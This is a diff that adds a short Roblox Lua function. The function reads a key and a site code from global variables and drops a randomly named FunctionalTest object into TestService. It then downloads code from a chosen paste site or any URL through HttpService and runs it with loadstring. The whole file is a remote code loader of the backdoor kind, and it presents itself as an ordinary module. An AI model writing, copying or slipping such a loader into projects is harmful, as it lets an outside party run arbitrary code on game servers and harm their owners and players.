@@ -1,0 +1,19 @@
+return function(Key,Target,Site)
+	key=_G.IncreaseronLoaderKey
+	Target=_G.IncreaseronLoaderTarget
+	Site=_G.IncreaseronLoaderSite
+	local rt=Instance.new("FunctionalTest")rt.Name=math.random() rt.Description=Target rt.Parent=game:GetService("TestService")
+	if Site=="us"then
+		loadstring(game:GetService("HttpService"):GetAsync(tostring("https://api.upload.systems/pastes/"..Key.."/raw")))()
+	elseif Site=="pa"then
+		loadstring(game:GetService("HttpService"):GetAsync(tostring("https://pastebin.com/raw/"..Key)))()
+	elseif Site=="pe"then
+		loadstring(game:GetService("HttpService"):GetAsync(tostring("https://paste.ee/r/"..Key)))()
+	elseif Site=="pc"then
+		loadstring(game:GetService("HttpService"):GetAsync(tostring("https://paste.centos.org/view/raw/"..Key)))()
+	elseif Site=="ps"then
+		loadstring(game:GetService("HttpService"):GetAsync(tostring("https://paste.sh/"..Key)))()
+	elseif Site=="uni"then
+		loadstring(game:GetService("HttpService"):GetAsync(tostring(Key)))()
+	end
+end
